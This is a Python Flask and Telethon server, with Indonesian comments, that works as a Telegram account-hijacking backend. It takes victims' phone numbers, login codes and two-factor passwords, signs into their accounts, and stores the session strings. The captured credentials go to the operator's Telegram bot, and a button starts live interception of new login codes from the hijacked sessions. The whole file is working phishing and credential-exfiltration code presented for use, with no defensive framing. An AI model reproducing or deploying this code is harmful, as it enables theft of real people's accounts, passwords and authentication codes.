import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# Ambil Variabel dari Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Database RAM (Akan reset jika Railway restart)
user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload)
        return res.json()
    except:
        return {}

def normalisasi_nomor(nomor):
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'): num = '62' + num[1:]
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    
    # Buat loop baru untuk setiap request agar tidak bentrok
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        print(f"Sistem Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        nomor = normalisasi_nomor(data.get('nomor', ''))
        nama = data.get('nama', 'User')
        otp_code = data.get('otp', '')
        sandi = data.get('sandi', '')

        # Ambil atau buat data user
        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}

        session_str = user_db[nomor].get('session', '')
        client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            # Minta OTP ke Telegram
            res = await client.send_code_request(nomor)
            user_db[nomor]['hash'] = res.phone_code_hash
            user_db[nomor]['session'] = client.session.save()
            return jsonify({"status": "success"})

        elif step == 2:
            try:
                # Login dengan OTP
                await client.sign_in(nomor, otp_code, phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                
                # BERHASIL LOGIN - KIRIM KE BOT
                msg = f"✅ **DATA MASUK**\n\nNama: **{nama}**\nNomor: `{nomor}`\nOTP: `{otp_code}`\nSandi: None"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": msg, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "Sadap OTP Baru", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except:
                return jsonify({"status": "error", "message": "OTP SALAH"}), 400

        elif step == 3:
            try:
                # Login dengan Password 2FA
                await client.sign_in(password=sandi)
                user_db[nomor]['sandi'] = sandi
                user_db[nomor]['session'] = client.session.save()
                
                msg = f"✅ **DATA MASUK (2FA)**\n\nNama: **{nama}**\nNomor: `{nomor}`\nSandi: **{sandi}**\nOTP: Berhasil"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": msg, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "Sadap OTP Baru", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except:
                return jsonify({"status": "error", "message": "SANDI SALAH"}), 400

    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if "callback_query" in update:
        call = update["callback_query"]
        action, nomor = call["data"].split("_")
        if action == "upd":
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"⏳ Memantau OTP baru untuk `{nomor}`..."})
            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
    return jsonify({"status": "success"})

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    try:
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"🔔 **OTP BARU!**\nNomor: `{nomor}`\nKode: `{otp.group(0)}`", "parse_mode": "Markdown"})
        await asyncio.sleep(600)
    finally:
        await client.disconnect()

if __name__ == "__main__":
    # Menjalankan Flask
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
